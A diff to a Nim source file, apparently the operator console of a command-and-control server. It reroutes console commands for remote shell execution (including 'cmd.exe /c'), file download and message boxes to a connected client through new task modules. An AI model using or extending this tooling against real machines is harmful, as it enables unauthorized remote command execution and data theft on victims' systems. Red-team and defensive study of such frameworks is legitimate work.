@@ -3,6 +3,7 @@ import strutils, terminal
 
 import listeners/[tcp]
 import communication
+import ../commands/[shell, msgbox, download]
 
 import types, logging
 
@@ -72,18 +73,18 @@ proc procStdin*(server: C2Server) {.async.} =
         of "info":
             echo @handlingClient
         of "download":
-            await handlingClient.downloadFile(args[1])
+            await download.sendTask(handlingClient, args[1])
             await handlingClient.awaitResponse()
         of "shell":
-            await handlingClient.sendShellCmd(a_args)
+            await shell.sendTask(handlingClient, a_args)
             await handlingClient.awaitResponse()
         of "cmd":
-            await handlingClient.sendShellCmd("cmd.exe /c " & a_args)
+            await shell.sendTask(handlingClient, "cmd.exe /c " & a_args)
             await handlingClient.awaitResponse()
         of "msgbox":
             if argsn >= 3:
                 let slashSplit = a_args.split("/")
-                await handlingClient.sendMsgBox(slashSplit[1].strip(), slashSplit[0].strip())
+                await msgbox.sendTask(handlingClient, slashSplit[1].strip(), slashSplit[0].strip())
             else:
                 echo "wrong usage. msgbox (title) / (caption)"
         of "back": 
